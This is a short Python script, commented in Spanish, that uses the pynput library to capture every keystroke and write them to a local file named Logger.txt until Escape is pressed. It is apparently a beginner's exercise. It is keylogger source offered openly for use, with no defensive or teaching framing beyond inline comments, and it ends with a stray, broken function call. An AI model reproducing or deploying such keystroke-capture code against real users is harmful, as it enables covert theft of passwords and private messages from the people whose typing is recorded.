## No funciona en MAC

# pip install pynput


import datetime
# Desde la libreria PynPut.Keyboar (Teclado) importamos escuchar lo que se tecle
from pynput.keyboard import Key , Listener 
# Capturamos la fecha y la hora y la guardamos en real_time
real_time = datetime.datetime.now().strftime("%y-%m-%d %H-%M-%S")
# real_time = datetime.datetime.now(tz="UTC-5") 

# Creamos una lista vacia
keys = [] 

# Creamos uan funcion presionar tecla
def app():
    
    def presionar_tecla(key):
        keys.append(key)
        convertir_str(keys)
        print(keys)
        
    def convertir_str(keys):
        with open("Logger.txt","w") as logfile:
            for key in keys:
                key = str(key).replace("x0x","")
                logfile.write(key)

    def soltar_tecla(key):
        if key == Key.esc:
            return False
        
    with Listener(on_press = presionar_tecla,on_release = soltar_tecla) as listener:
        listener.join()               
    presionar_tecla()
app()

## No funciona en MAC